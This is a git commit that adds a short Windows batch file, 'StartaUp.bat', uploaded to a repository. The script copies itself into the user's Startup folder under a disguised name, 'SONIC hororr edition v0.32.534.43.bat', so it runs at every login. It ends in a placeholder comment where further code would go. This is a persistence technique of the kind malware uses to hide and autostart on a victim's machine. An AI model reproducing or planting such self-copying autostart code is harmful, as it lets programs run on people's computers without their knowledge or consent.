5ce07a4ed211eda1c00a5b7711ecc0eec6273ae6
mihneastefan20155 <comunityyou7@gmail.com>
2024-06-01 13:40:39 +0300

    Add files via upload

---
+++ StartaUp.bat
@@ -0,0 +1,5 @@
+@echo off
+if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SONIC hororr edition v0.32.534.43.bat" (
+  copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SONIC hororr edition v0.32.534.43.bat"
+)
+REM Rest of code here.........
